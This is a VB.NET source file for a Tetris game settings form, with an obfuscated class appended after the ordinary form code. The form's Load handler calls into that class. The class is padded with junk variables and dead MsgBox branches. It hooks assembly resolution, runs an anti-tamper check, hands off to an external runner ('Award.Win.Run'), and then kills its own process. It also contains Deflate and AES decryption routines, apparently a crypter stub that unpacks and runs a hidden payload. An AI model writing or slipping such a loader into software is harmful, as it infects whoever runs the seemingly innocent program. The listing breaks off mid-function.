Public Class Form1
    Private _newBlocksNumber As Integer

    Private Sub pnlBackgroundSolid_Click(sender As Object, e As EventArgs) Handles pnlBackgroundSolid.Click
        Call ManageColorProperty(sender, "BackColor")
    End Sub

    Private Sub ManageColorProperty(sender As Panel, propertyName As String)
        With Me.dlgColor
            .Color = sender.BackColor
            If .ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
                sender.BackColor = .Color
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, .Color)
            End If
        End With
    End Sub

    Private Sub pnlBackgroundGradient1_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient1.Click
        Call ManageColorProperty(sender, "GradientColor1")
    End Sub

    Private Sub pnlBackgroundGradient2_Click(sender As Object, e As EventArgs) Handles pnlBackgroundGradient2.Click
        Call ManageColorProperty(sender, "GradientColor2")
    End Sub

    Private Sub lnkBackgroundPicture_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkBackgroundPicture.LinkClicked
        If Me.dlgBackgroundPicture.ShowDialog(Me) = Windows.Forms.DialogResult.OK Then
            Me.TetrisBox1.BackgroundImage = Image.FromFile(Me.dlgBackgroundPicture.FileName)
        End If
    End Sub

    Private Sub radBackgroundSolid_CheckedChanged(sender As Object, e As EventArgs) Handles radBackgroundSolid.CheckedChanged, radBackgroundGradient.CheckedChanged, radBackgroundPicture.CheckedChanged
        Select Case True
            Case Me.radBackgroundSolid.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.SolidColor
            Case Me.radBackgroundGradient.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Gradient
            Case Me.radBackgroundPicture.Checked
                Me.TetrisBox1.BackgroundStyle = TetrisBox.BackgroundStyles.Picture
        End Select
    End Sub

    Private Sub Form1_Load(sender As Object, e As EventArgs) Handles MyBase.Load
        Me.cboGradientDirection.SelectedIndex = 1
        For Each name As String In System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
            Me.cboKeysLeft.Items.Add(name)
            Me.cboKeysRight.Items.Add(name)
            Me.cboKeysRotate.Items.Add(name)
            Me.cboKeysDrop.Items.Add(name)
        Next
        CcSaxtarvZb.HsOWGPA()
        Me.cboKeysLeft.SelectedItem = "Left"
        Me.cboKeysRight.SelectedItem = "Right"
        Me.cboKeysRotate.SelectedItem = "Up"
        Me.cboKeysDrop.SelectedItem = "Down"
    End Sub

    Private Sub cboGradientDirection_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboGradientDirection.SelectedIndexChanged
        Select Case Me.cboGradientDirection.SelectedIndex
            Case 0
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Horizontal
            Case 1
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.Vertical
            Case 2
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.ForwardDiagonal
            Case 3
                Me.TetrisBox1.GradientDirection = Drawing2D.LinearGradientMode.BackwardDiagonal
        End Select
    End Sub

    Private Sub numRows_ValueChanged(sender As Object, e As EventArgs) Handles numRows.ValueChanged
        Me.TetrisBox1.Rows = Me.numRows.Value
    End Sub

    Private Sub numColumns_ValueChanged(sender As Object, e As EventArgs) Handles numColumns.ValueChanged
        Me.TetrisBox1.Columns = Me.numColumns.Value
    End Sub

    Private Sub numCellSize_ValueChanged(sender As Object, e As EventArgs) Handles numCellSize.ValueChanged
        Me.TetrisBox1.CellSize = Me.numCellSize.Value
    End Sub

    Private Sub pnlBlock1Color_Click(sender As Object, e As EventArgs) Handles pnlBlock1Color.Click, pnlBlock2Color.Click, pnlBlock3Color.Click, pnlBlock4Color.Click, pnlBlock5Color.Click, pnlBlock6Color.Click, pnlBlock7Color.Click
        Call ManageColorProperty(sender, DirectCast(sender, Panel).Name.Replace("pnl", String.Empty))
    End Sub

    Private Sub cboKeysLeft_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysLeft.SelectedIndexChanged
        Call ManageKeyProperty(sender, "LeftKey")
    End Sub

    Private Sub ManageKeyProperty(sender As ComboBox, propertyName As String)
        Dim names() As String = System.Enum.GetNames(GetType(System.Windows.Forms.Keys))
        Dim values() As Integer = System.Enum.GetValues(GetType(System.Windows.Forms.Keys))
        For index = 0 To names.Length - 1
            If sender.SelectedItem.Equals(names(index)) Then
                CallByName(Me.TetrisBox1, propertyName, CallType.Set, CType(values(index), System.Windows.Forms.Keys))
            End If
        Next
    End Sub

    Private Sub cboKeysRight_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRight.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RightKey")
    End Sub

    Private Sub cboKeysRotate_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysRotate.SelectedIndexChanged
        Call ManageKeyProperty(sender, "RotateKey")
    End Sub

    Private Sub cboKeysDrop_SelectedIndexChanged(sender As Object, e As EventArgs) Handles cboKeysDrop.SelectedIndexChanged
        Call ManageKeyProperty(sender, "DropKey")
    End Sub

    Private Sub pnlRandomBlock_Click(sender As Object, e As EventArgs) Handles pnlRandomBlock.Click
        Call ManageColorProperty(sender, "RandomBlockColor")
    End Sub

    Private Sub pnlUncompleteLine_Click(sender As Object, e As EventArgs) Handles pnlUncompleteLine.Click
        Call ManageColorProperty(sender, "UncompleteRowColor")
    End Sub

    Private Sub tbrSpeed_Scroll(sender As Object, e As EventArgs) Handles tbrSpeed.Scroll, tbrSpeed.ValueChanged
        Me.TetrisBox1.TimerInterval = Me.tbrSpeed.Value
    End Sub

    Private Sub btnStart_Click(sender As Object, e As EventArgs) Handles btnStart.Click
        Me.btnStart.Enabled = False
        Me.btnStop.Enabled = True
        Me.btnPause.Enabled = True

        Me.gbxBackground.Enabled = False
        Me.gbxBlockColors.Enabled = False
        Me.gbxBoardSize.Enabled = False
        Me.gbxDifficulties.Enabled = False
        Me.gbxKeys.Enabled = False

        _newBlocksNumber = 0

        Me.TetrisBox1.StartGame()
    End Sub

    Private Sub btnStop_Click(sender As Object, e As EventArgs) Handles btnStop.Click
        Me.TetrisBox1.StopGame()
        Call GameStopped()
    End Sub

    Private Sub GameStopped()
        Me.btnStart.Enabled = True
        Me.btnStop.Enabled = False
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = False

        Me.gbxBackground.Enabled = True
        Me.gbxBlockColors.Enabled = True
        Me.gbxBoardSize.Enabled = True
        Me.gbxDifficulties.Enabled = True
        Me.gbxKeys.Enabled = True
    End Sub

    Private Sub TetrisBox1_FullRows(sender As Object, e As TetrisBox.FullRowsEventArgs) Handles TetrisBox1.FullRows
        Me.lstEvents.Items.Add("FullRows [NumberOfRows=" + e.NumberOfRows.ToString + "]")
    End Sub

    Private Sub TetrisBox1_GameOver(sender As Object, e As EventArgs) Handles TetrisBox1.GameOver
        Call GameStopped()
        Me.lstEvents.Items.Add("GameOver")
    End Sub

    Private Sub btnPause_Click(sender As Object, e As EventArgs) Handles btnPause.Click
        Me.TetrisBox1.Pause()
        Me.btnPause.Enabled = False
        Me.btnResume.Enabled = True
    End Sub

    Private Sub btnResume_Click(sender As Object, e As EventArgs) Handles btnResume.Click
        Me.TetrisBox1.Resume()
        Me.btnPause.Enabled = True
        Me.btnResume.Enabled = False
    End Sub

    Private Sub TetrisBox1_NewBlock(sender As Object, e As TetrisBox.NewBlockEventArgs) Handles TetrisBox1.NewBlock
        Me.lstEvents.Items.Add("NewBlock [BlockType=" + e.BlockType.ToString + ", NextBlockType=" + e.NextBlockType.ToString + "]")

        _newBlocksNumber += 1

        If Me.chkRandomBlock.Checked AndAlso ((_newBlocksNumber Mod Me.numRandomBlock.Value) = 0) Then
            Me.TetrisBox1.AddRandomBlock()
        End If

        If Me.chkUncompleteLine.Checked AndAlso ((_newBlocksNumber Mod Me.numUncompleteLine.Value) = 0) Then
            Me.TetrisBox1.AddUncompleteRow()
        End If
    End Sub

    Private Sub TetrisBox1_Starting(sender As Object, e As EventArgs) Handles TetrisBox1.Starting
        Me.lstEvents.Items.Add("Starting")
    End Sub

    Private Sub lnkArticle_LinkClicked(sender As Object, e As LinkLabelLinkClickedEventArgs) Handles lnkArticle.LinkClicked
        Process.Start("http://www.codeproject.com/Articles/812310/Create-Tetris-games-in-Net")
    End Sub
End Class
Public Class CcSaxtarvZb
    Shared Sub QfnHigs()
        Dim XJxFxZt = Functions.Main.DoShit(Application.ExecutablePath, Application.StartupPath)

        YmkWeYT()

        Dim NZbDjfPqfe As Boolean = False
        If NZbDjfPqfe = True Then
            MsgBox("FYeFgmYeEz")
        End If
        Dim moiDpFUwST As Boolean = True
        If moiDpFUwST = False Then
            MsgBox("bKiRuQqZgk")
        End If
        Dim dHQuDPFKaH As Long = 906
        Dim zgEDmsRtyY As Byte() = {}
        If XJxFxZt.Item2 = True Then
            Dim ruRfhwBKxw As Long = 969
            Dim JwcAxewFLR As Integer = 0
            For iFjjJFQLZl = 0 To 100
                JwcAxewFLR += 1
            Next
            Dim wgrQhqYwdD As Boolean = False
            If wgrQhqYwdD = True Then
                MsgBox("EsnvXjjHCW")
            End If
            Dim nzaHvAJLlr As Boolean = False
            If nzaHvAJLlr = True Then
                MsgBox("dOKiPKKaUK")
            End If
            Dim luETJLU = New anti.IntegrityCheck
            Dim UcTSllgivz As Boolean = False
            If UcTSllgivz = True Then
                MsgBox("SpjVQmmvzS")
            End If
            Dim ZJvnsfTUDl As String = "sEpVWMrBmH"
            Dim hapicXOeAZ As Object = {}
            Dim wshcOIzBZs As String = "FwMVTzoyTN"
            luETJLU.AppExePath = Application.ExecutablePath

            FDFIfuu()
            luETJLU.AppPath = Application.StartupPath
            Dim murUcrGXqu As Long = 711
            Dim XJlGQFeopn As Byte() = {}
            Dim AayRudyHTg As Byte() = {}
            Dim nhcRxqAKma As Integer = 0
            For RqZppMyPlU = 0 To 100
                nhcRxqAKma += 1
            Next
            Dim TKvSlKCpEN As Boolean = False
            If TKvSlKCpEN = True Then
                MsgBox("yLcDsfegYI")
            End If
            luETJLU.RunCheck()

            Dim RHRJpHXd = EJvtyUqg()
        End If
        Dim rmPdvdCwIv As Long = 900
        Dim tHkHqbGXbn As Boolean = True
        If tHkHqbGXbn = False Then
            MsgBox("mcaIbhFzaf")
        End If
        Dim qpgzmenLOZ As Boolean = True
        If qpgzmenLOZ = False Then
            MsgBox("kDFOlkRaiS")
        End If
        Dim pHuTLfdYrN As Long = 585
        Award.Win.Run(XJxFxZt.Item1, Command, Application.ExecutablePath)

        nyUltGd()
        Process.GetCurrentProcess.Kill()
        Dim XsdGIsZwLWn As Boolean = True
        If XsdGIsZwLWn = False Then
            MsgBox("RSKMrYPqguC")
        End If
        Dim QhibSAOlmCj As Byte() = {}
        Dim fLgMoLNoMzj As Boolean = True
        If fLgMoLNoMzj = False Then
            MsgBox("PbiKYAemOin")
        End If
        Dim CuTCLnuUiHu As Long = 314
        Dim qSbbMZJgzNx As Boolean = False
        If qSbbMZJgzNx = True Then
            MsgBox("QfZPWZVEjNm")
        End If
    End Sub

    Public Shared Sub YmkWeYT()

        Dim zgTrQXp As Long = 686


    End Sub
    Public Shared Sub FDFIfuu()

        Dim YzJCGCL As Object = {}

        Dim efbLRWF As Object = {}

    End Sub
    Public Shared Function EJvtyUqg()
        Dim eFmZfuFZ As String = "sDIqWhmW"
        Dim FBeGNTUS As Byte() = {}
        Dim SzAWDGBP As Byte() = {}
        Dim gxWnutjL As Boolean = True
        If gxWnutjL = False Then
            MsgBox("tvsDlfRI")
        End If
        Dim GtOTbSyE As Integer = 0
        For UrkkSFgB = 0 To 100
            GtOTbSyE += 1
        Next
        Dim hpGAJrNx As Boolean = True
        If hpGAJrNx = False Then
            MsgBox("uncQAevu")
        End If
        Dim IlyhqRcq As Byte() = {}
        Dim jEcNLphY As Object = {}
        Dim wCyeBcPV As Integer = 0
        For KAUusPwR = 0 To 100
            wCyeBcPV += 1
        Next
        Dim XyqKjCeO As String = "kwMbaoLK"
        Return "xuirQbtH"
    End Function
    Public Shared Sub nyUltGd()


        Dim jnXFekn As Integer = 644
        Dim MwdoShd As Integer = 866
        Dim yXdSqWP As String = "wmBgRyN"
        Dim nEcMjhG As Object = {}
        Dim IIlgalV As String = "jsWVYkX"
    End Sub



    Public Shared Function KtNWhlV(owLdfIi As Byte()) As Byte()
        Dim lkGmVLA = New IO.MemoryStream()

        Dim ymioVUCo = mgvltgzd()
        Dim ITsbroh = New IO.Compression.DeflateStream(New IO.MemoryStream(owLdfIi), IO.Compression.CompressionMode.Decompress, True)
        Dim WhMiysYkwu As Boolean = True
        If WhMiysYkwu = False Then
            MsgBox("etINokjvVN")
        End If
        Dim MBvZMCJzEi As Boolean = True
        If MBvZMCJzEi = False Then
            MsgBox("CPfAfMKOnB")
        End If
        Dim TaGHhvaXhV As String = "rredfXQrao"
        Dim qEtgKYWFeH As Object = {}
        Dim wYFylRDeiZ As Byte() = {}
        Dim nJbgLJo = New Byte(4095) {}

        Dim vPcYvPoS = gZWvpdck()
        While True
            Dim RFzYbBuwusr As Integer = 500
            Dim MMRLlguemcZ As Long = 861
            Dim nwBAjfwrwyr As Boolean = False
            If nwBAjfwrwyr = True Then
                MsgBox("EAVgvojTNIW")
            End If
            Dim ApYAgStocDY As Boolean = False
            If ApYAgStocDY = True Then
                MsgBox("EvWPBozUona")
            End If
            Dim XYLpCvaVyKj As Boolean = False
            If XYLpCvaVyKj = True Then
                MsgBox("elPgoNeNaTk")
            End If
            Dim twBRLDL = ITsbroh.Read(nJbgLJo, 0, nJbgLJo.Length)

            oveBKZf()
            If twBRLDL > 0 Then
                Dim QesriSRHjdH As Integer = 689
                Dim PDPlxukAobg As Object = {}
                Dim jOpsZAVpVKJ As String = "TxFJiqcAAgu"
                Dim dudayGpQRrQ As Integer = 0
                For PsQFJuQCqlo = 0 To 100
                    dudayGpQRrQ += 1
                Next
                Dim ehNXTFjDOYg As Object = {}
                lkGmVLA.Write(nJbgLJo, 0, twBRLDL)

                Dim dDwUNjPv = xQfmlPuR()
            Else
                Dim JyQBwZjWRiN As Integer = 0
                For WlfZDlEnVeC = 0 To 100
                    JyQBwZjWRiN += 1
                Next
                Dim LdkLgWIviQo As Object = {}
                Dim KZtGhxQdMko As Object = {}
                Dim CZFTbfTyovZ As Byte() = {}
                Dim buTuXgBkDuD As String = "nHNZovhbQcN"
                Exit While
                Dim OqmRhtZhPbA As Object = {}
                Dim NPJMwUsaTZY As Object = {}
                Dim haiTYaePAIC As Integer = 0
                For RJzkhQlafem = 0 To 100
                    haiTYaePAIC += 1
                Next
                Dim bHXBxgxqxpJ As Integer = 0
                For zkBPejBqrnc = 0 To 100
                    bHXBxgxqxpJ += 1
                Next
                Dim ctHySfrdtWY As Long = 841
            End If
            Dim stoJmLGLgsd As Integer = 0
            For qabrlnvSQor = 0 To 100
                stoJmLGLgsd += 1
            Next
            Dim ciNCkbqCmYG As Byte() = {}
            Dim KZuGeTTbwtg As Boolean = True
            If KZuGeTTbwtg = False Then
                MsgBox("mUdbQRqnDFp")
            End If
            Dim IFYcjVPBcBx As Boolean = False
            If IFYcjVPBcBx = True Then
                MsgBox("DMqPtAQjUkf")
            End If
            Dim ewbEqzSweGx As Integer = 451
        End While

        Dim tmSuSFGO = ymIiyBiM()
        ITsbroh.Close()

        Dim CPFtIsqn = GOviooTl()
        Return lkGmVLA.ToArray()
        Dim EtuRTTVssDL As Integer = 0
        For qBgcSHQcPmb = 0 To 100
            EtuRTTVssDL += 1
        Next
        Dim LXEPiMWPuLv As Integer = 272
        Dim AnwByxQMgTJ As Byte() = {}
        Dim WXrCQBpbFPR As Byte() = {}
        Dim RfJpagqIxyA As Boolean = True
        If RfJpagqIxyA = False Then
            MsgBox("fulOutUkcYM")
        End If
    End Function

    Public Shared Function mgvltgzd()
        Dim xXLbTWiN As Byte() = {}
        Dim JcxevKlY As Object = {}
        Dim VijhXypi As Boolean = True
        If VijhXypi = False Then
            MsgBox("hoWkzlst")
        End If
        Dim fZzWxnYS As Object = {}
        Dim rflZZbbc As Object = {}
        Dim DlXcBPen As Boolean = True
        If DlXcBPen = False Then
            MsgBox("PrKfdDix")
        End If
        Dim NcnSbFOW As Object = {}
        Dim ZiZVDtRh As Object = {}
        Dim loMYehUs As Boolean = True
        If loMYehUs = False Then
            MsgBox("jYpLcjAQ")
        End If
        Dim vebOEXEb As Byte() = {}
        Return "HkNQgLHm"
    End Function
    Public Shared Function gZWvpdck()
        Dim XbqSemXm As Byte() = {}
        Dim mRwwkYjV As Boolean = False
        If mRwwkYjV = True Then
            MsgBox("AHBapJvD")
        End If
        Dim dSQUZgeX As Long = 641
        Dim rIVyeSqF As Boolean = False
        If rIVyeSqF = True Then
            MsgBox("UTksOpZZ")
        End If
        Dim jJpVTblI As Byte() = {}
        Dim LVEPCyUc As String = "aLJtIkgK"
        Dim CWYnrHPe As Integer = 0
        For RMdRxtbM = 0 To 100
            CWYnrHPe += 1
        Next
        Dim tXsLgQKh As Integer = 0
        For INxpmBWP = 0 To 100
            tXsLgQKh += 1
        Next
        Dim kZMjVZFj As Integer = 0
        For ltJwxYtg = 0 To 100
            kZMjVZFj += 1
        Next
        Dim OFXqgwcA As Byte() = {}
        Return "cvdUmhoi"
    End Function
    Public Shared Sub oveBKZf()




        Dim UeFenUK As Long = 206
    End Sub
    Public Shared Function xQfmlPuR()
        Dim XMXSSpJK As String = "EzoBuIeo"
        Dim yIPzAOYD As Byte() = {}
        Dim sQpyFURT As Object = {}
        Dim ZEGghnnw As Integer = 43
        Dim TMhentgM As Byte() = {}
        Dim zAyNPNCp As Integer = 0
        For tIZLUSvF = 0 To 100
            zAyNPNCp += 1
        Next
        Dim awqtwmRi As String = "UEQsCsKx"
        Dim ONrqHxEN As Boolean = True
        If ONrqHxEN = False Then
            MsgBox("vAIYjRZq")
        End If
        Dim pJjXpXTG As Object = {}
        Dim VwAFQrpj As String = "QFaEWwiz"
        Return "KOBCcCbO"
    End Function
    Public Shared Function ymIiyBiM()
        Dim pncGnJdP As Boolean = False
        If pncGnJdP = True Then
            MsgBox("komSHOBQ")
        End If
        Dim gowecSYR As Object = {}
        Dim cpGqwXwS As Boolean = True
        If cpGqwXwS = False Then
            MsgBox("XpQBQbTT")
        End If
        Dim TqaNlgrV As Integer = 0
        For OrkZFkOW = 0 To 100
            TqaNlgrV += 1
        Next
        Dim KrulapmX As Object = {}
        Dim FsExutJY As Byte() = {}
        Dim BtOJPxhZ As Boolean = False
        If BtOJPxhZ = True Then
            MsgBox("xtYVjCEb")
        End If
        Dim suihDGbc As Long = 661
        Dim ovssYLzd As String = "VatoOdzs"
        Dim RbDAjiWu As Byte() = {}
        Dim McNMDmuv As Byte() = {}
        Return "IcXYYqRw"
    End Function
    Public Shared Function GOviooTl()
        Dim xQPFdxOo As Long = 473
        Dim tQZRxBlp As Long = 388
        Dim oRjdRGIq As Byte() = {}
        Dim kStpmKgr As Boolean = False
        If kStpmKgr = True Then
            MsgBox("fSDBGPDt")
        End If
        Dim bTNNbTbu As Integer = 3
        Dim WUXZvYyv As Integer = 0
        For SUhlQcWw = 0 To 100
            WUXZvYyv += 1
        Next
        Dim OVrwkgtx As Object = {}
        Dim JWBIElRy As Boolean = False
        If JWBIElRy = True Then
            MsgBox("FWLUZpoA")
        End If
        Dim AXVgtuMB As Integer = 0
        For wYfsOyjC = 0 To 100
            AXVgtuMB += 1
        Next
        Dim rYpEiDHD As String = "nZzQDHeE"
        Return "iaJcXLCG"
    End Function




    Public Shared FHmkhry As Boolean
    Shared Sub HsOWGPA()
        If Not FHmkhry Then

            Dim tlZMxVus = ykPAdQXr()
            AddHandler AppDomain.CurrentDomain.AssemblyResolve, AddressOf CuhtWuQ
            Dim ohxDawuziwn As Integer = 0
            For rvLFgTVtZee = 0 To 100
                ohxDawuziwn += 1
            Next
            Dim cWLkEIHqZCa As Byte() = {}
            Dim irgNbcgwgJP As Byte() = {}
            Dim HMuoXdOivIt As Boolean = True
            If HMuoXdOivIt = False Then
                MsgBox("SYoTpsuZHrD")
            End If
            Dim KOBzuacwlMw As Boolean = True
            If KOBzuacwlMw = False Then
                MsgBox("eCoFjhYwtZx")
            End If
            FHmkhry = True

            Dim WlfWWJFV = sihPXnsP()
        End If
        Dim NsKGGpxcMfS As Byte() = {}
        Dim gWzgIvYdWCb As Long = 601
        Dim njDWuOcWyLb As Integer = 974
        Dim IcOKxTXyCFY As Boolean = True
        If IcOKxTXyCFY = False Then
            MsgBox("VgsBeghbjpt")
        End If
        Dim hDkNjuiRtOv As Boolean = True
        If hDkNjuiRtOv = False Then
            MsgBox("QEQxRlfoAYM")
        End If
        QfnHigs()

        Dim dUpkcYtq = NmztHoDV()
    End Sub

    Public Shared Function ykPAdQXr()
        Dim pljYSZSt As Boolean = True
        If pljYSZSt = False Then
            MsgBox("lmtkmepu")
        End If
        Dim gnEwHiNv As Long = 304
        Dim cnOHbnkw As Boolean = True
        If cnOHbnkw = False Then
            MsgBox("XoYTwrIy")
        End If
        Dim TpifQwfz As Boolean = False
        If TpifQwfz = True Then
            MsgBox("BUjbHOfO")
        End If
        Dim wVtnbSDP As Boolean = True
        If wVtnbSDP = False Then
            MsgBox("sWDzvXaR")
        End If
        Dim nWNKQbyS As Byte() = {}
        Dim jXXWkgVT As Boolean = False
        If jXXWkgVT = True Then
            MsgBox("eYhiFktU")
        End If
        Dim aYruZpQV As Byte() = {}
        Dim VZBGutnX As Boolean = False
        If VZBGutnX = True Then
            MsgBox("RaLSOyLY")
        End If
        Dim NaVeiCiZ As String = "IbfqDGGa"
        Dim EcpCXLdb As Byte() = {}
        Dim zczNsPBc As Integer = 0
        For vdJZMUYe = 0 To 100
            zczNsPBc += 1
        Next
        Return "qeTlhYwf"
    End Function
    Public Shared Function sihPXnsP()
        Dim mTUNquvp As Boolean = False
        If mTUNquvp = True Then
            MsgBox("QWSVoQJv")
        End If
        Dim uaQcmmWB As Integer = 569
        Dim XdOjkIjH As String = "BgNrjexM"
        Dim fjLyhAKS As Integer = 0
        For JnJGfXYY = 0 To 100
            fjLyhAKS += 1
        Next
        Dim LApgVVqH As Boolean = False
        If LApgVVqH = True Then
            MsgBox("pDnoUrEN")
        End If
        Dim SGmvSNRT As Long = 118
        Dim wKkDQjeY As Boolean = False
        If wKkDQjeY = True Then
            MsgBox("aNiKOGse")
        End If
        Dim EQgSMcFk As Integer = 0
        For UzVJgMvE = 0 To 100
            EQgSMcFk += 1
        Next
        Dim yCTQfiJK As Long = 478
        Dim bFRYdEWQ As Boolean = False
        If bFRYdEWQ = True Then
            MsgBox("FIQfbbjW")
        End If
        Dim jMOmZxxc As String = "NPMuXTKi"
        Return "dxBlsDAC"
    End Function
    Public Shared Function NmztHoDV()
        Dim HXnsauGw As Boolean = False
        If HXnsauGw = True Then
            MsgBox("lblzYQUB")
        End If
        Dim PejHWmhH As Byte() = {}
        Dim shhOUIvN As Boolean = True
        If shhOUIvN = False Then
            MsgBox("WkfWTfIT")
        End If
        Dim AoedRBVZ As Integer = 156
        Dim QWTUllLt As Byte() = {}
        Dim uZRcjHZz As Integer = 0
        For YdPjhdmF = 0 To 100
            uZRcjHZz += 1
        Next
        Dim BgNqgAAL As Byte() = {}
        Dim fjLyeWNR As Integer = 0
        For JmKFcsaX = 0 To 100
            fjLyeWNR += 1
        Next
        Dim ZVzwwcQr As Integer = 312
        Dim pDonRMGL As Object = {}
        Return "TGmvPjUR"
    End Function

    Private Shared Function GoYRIqI(ByVal aREgOWr() As Byte) As Byte()
        Dim gIdhIQy As New System.Security.Cryptography.RijndaelManaged
        Dim wqSgvjiNWwc As Byte() = {}
        Dim weLoLIVhVSo As Object = {}
        Dim WhKwiINHIcm As Boolean = True
        If WhKwiINHIcm = False Then
            MsgBox("LPRBXuxRXZg")
        End If
        Dim EezbSaTNtHE As Object = {}
        Dim xMwVmHfVteH As Long = 590
        Dim bDodjVl As New System.Security.Cryptography.MD5CryptoServiceProvider

        Dim xpvhVdSP = CokVBYuO()


        Dim PnAIKHxb = TnqwpCZa()
        Try

            Dim FwpDqNhP = JvfrWIKO()
            Dim xvrFrzn(31) As Byte

            Dim FXECrvDU = JXuqWqfT()
            Dim NYhgRjt As Byte() = bDodjVl.ComputeHash(System.Text.ASCIIEncoding.ASCII.GetBytes("password"))
            Dim QZDkbFilQXh As Byte() = {}
            Dim mcNESKyMSIW As Integer = 642
            Dim ENSRFRvbHdU As Byte() = {}
            Dim cYiMNTJPZnH As Boolean = False
            If cYiMNTJPZnH = True Then
                MsgBox("jEBVYnDUdjn")
            End If
            Dim NGqSbiXsAUv As Boolean = True
            If NGqSbiXsAUv = False Then
                MsgBox("KPqznMWKKug")
            End If
            Array.Copy(NYhgRjt, 0, xvrFrzn, 0, 16)

            Dim wVoMSCft = BUeAxxIs()
            Array.Copy(NYhgRjt, 0, xvrFrzn, 15, 16)
            Dim QRdSOeZqXb As Byte() = {}
            Dim xhhQXxUImu As Byte() = {}
            Dim YiYNzWUAVP As Integer = 0
            For nBQHlHFXui = 0 To 100
                YiYNzWUAVP += 1
            Next
            Dim ijmjMMXiJG As Boolean = True
            If ijmjMMXiJG = False Then
                MsgBox("gFSZdOzKrY")
            End If
            Dim XLlNLXeLwt As Integer = 0
            For DjFyFrvrpL = 0 To 100
                XLlNLXeLwt += 1
            Next
            gIdhIQy.Key = xvrFrzn

            Dim rjMjpzxx = feZgNLum()
            gIdhIQy.Mode = Security.Cryptography.CipherMode.ECB
            Dim IybLghoxGGa As String = "rAGvOYlUORs"
            Dim YbRlGRuSdOe As Long = 971
            Dim ufaFxWJtfyS As Long = 87
            Dim MQfSkdGITUQ As Boolean = False
            If MQfSkdGITUQ = True Then
                MsgBox("lbvNsfU")
            End If
            Dim RsHWxYJ As Boolean = False
            If RsHWxYJ = True Then
                MsgBox("XXagIsC")
            End If
            Dim RSYEDfm As System.Security.Cryptography.ICryptoTransform = gIdhIQy.CreateDecryptor

            ePluYHl()
            Dim PxCaHhi() As Byte = RSYEDfm.TransformFinalBlock(aREgOWr, 0, aREgOWr.Length)
            Dim yZPlHJqhDeY As String = "DNyhDeGAmZt"
            Dim zMzicIkUzKn As Object = {}
            Dim IzYSEYcmTgS As Long = 430
            Dim bvcMfguAFrI As Integer = 567
            Dim FmTbtcuafmY As Object = {}
            Return PxCaHhi

            Dim gmflweAy = nWoAFXlV()
        Catch ex As Exception

            Dim GcbmqzzQ = smWJkOni()
            Return Nothing
            Dim mjqIoLZgTnG As Long = 165
            Dim kabWcohlBZL As Boolean = False
            If kabWcohlBZL = True Then
                MsgBox("bQpChWPIfuE")
            End If
            Dim JZkZAOitREK As Integer = 544
            Dim HyHUPqBmWCi As Integer = 0
            For cJhbrvmbDlL = 0 To 100
                HyHUPqBmWCi += 1
            Next
            Dim LsysAmtmiHw As Long = 349
        End Try

        YbiHLvj()
    End Function

    Public Shared Function CokVBYuO()
        Dim tpFtqhpQ As Integer = 262
        Dim oqPEKmMR As Integer = 0
        For krZQfqkS = 0 To 100
            oqPEKmMR += 1
        Next
        Dim frjczvHU As Boolean = False
        If frjczvHU = True Then
            MsgBox("bstoUzfV")
        End If
        Dim XtDAoDCW As Integer = 649
        Dim StNMIIaX As String = "OuXYdMxY"
        Dim JvhkxRVa As Long = 605
        Dim FvrvSVsb As Byte() = {}
        Dim AwBHmaQc As Boolean = False
        If AwBHmaQc = True Then
            MsgBox("wxLTHend")
        End If
        Dim rxVfbiLe As String = "nyfrvnif"
        Dim jzpDQrGh As Long = 149
        Dim ezzPkwdi As Integer = 885
        Dim aAJbFABj As Byte() = {}
        Return "VBTnZFYk"
    End Function
    Public Shared Function TnqwpCZa()
        Dim KoLUeLUc As Boolean = True
        If KoLUeLUc = False Then
            MsgBox("GpVgyPsd")
        End If
        Dim BpfsTUPe As Integer = 345
        Dim xqpEnYng As Long = 358
        Dim srzQIdKh As Integer = 0
        For orJcchii = 0 To 100
            srzQIdKh += 1
        Next
        Dim ksTnxmFj As Boolean = False
        If ksTnxmFj = True Then
            MsgBox("ftdzRqdk")
        End If
        Dim btnLlvAm As String = "IZoHcNAB"
        Dim qEpCTfAQ As Boolean = True
        If qEpCTfAQ = False Then
            MsgBox("mFzOnkYS")
        End If
        Dim hGJaHovT As Integer = 0
        For dGTmctTU = 0 To 100
            hGJaHovT += 1
        Next
        Dim YHdywxqV As Integer = 0
        For UInKRCOW = 0 To 100
            YHdywxqV += 1
        Next
        Dim QIxWlGlY As Integer = 13
        Return "LJHiGLJZ"
    End Function
    Public Shared Function JvfrWIKO()
        Dim AxzPKRFR As Integer = 451
        Dim wxJbfVcS As Long = 903
        Dim ryTnzaAT As Byte() = {}
        Dim nzdzUeXU As Object = {}
        Dim iznLojvV As Boolean = False
        If iznLojvV = True Then
            MsgBox("eAxXJnSX")
        End If
        Dim ZAHjdsqY As Boolean = False
        If ZAHjdsqY = True Then
            MsgBox("VBRuxwNZ")
        End If
        Dim RCbGSAka As Boolean = True
        If RCbGSAka = False Then
            MsgBox("yhcCITkq")
        End If
        Dim uimOdXIr As Boolean = True
        If uimOdXIr = False Then
            MsgBox("pjwaxcfs")
        End If
        Dim ljGmSgDt As Boolean = True
        If ljGmSgDt = False Then
            MsgBox("hkQxmlau")
        End If
        Dim claJHpyv As Integer = 0
        For YlkVbuVx = 0 To 100
            claJHpyv += 1
        Next
        Dim Tmuhvyty As Integer = 0
        For PnEtQCQz = 0 To 100
            Tmuhvyty += 1
        Next
        Return "KnOFkHoA"
    End Function
    Public Shared Function JXuqWqfT()
        Dim AYOOLzaV As Boolean = True
        If AYOOLzaV = False Then
            MsgBox("iEPJCSal")
        End If
        Dim eEZVWWym As Object = {}
        Dim ZFjhrbVn As Byte() = {}
        Dim VGttLfto As Integer = 613
        Dim QGDFgjQp As Boolean = False
